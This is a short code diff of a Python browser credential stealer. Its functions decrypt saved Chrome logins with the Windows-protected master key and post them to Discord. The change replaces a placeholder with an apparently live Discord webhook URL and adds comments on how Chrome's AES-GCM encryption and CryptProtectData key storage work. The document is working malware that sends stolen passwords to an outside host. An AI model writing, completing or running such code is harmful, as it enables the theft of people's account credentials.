@@ -9,8 +9,10 @@ from win32crypt import CryptUnprotectData
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 import requests
+#chrome encrypt files in AES-GCM format
+#master key for the format faund on the pc in phisical dir and using CryptProtectData func
 
-WEBHOOK_URL = "#your DIS WH"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcpsOVjSLsS3rZyYGiRDS49oKPa0myTKTAnRJ_vwqNhaFggDyJOfhji-"
 
 def decrypt(buff, master_key):
     try:
@@ -129,7 +131,7 @@ def collect_chrome_logins():
         except:
             continue
     return logins
-
+#json for https post format
 def send_to_discord(data):
     json_data = json.dumps(data, indent=2, ensure_ascii=False)
     MAX_LEN = 1900
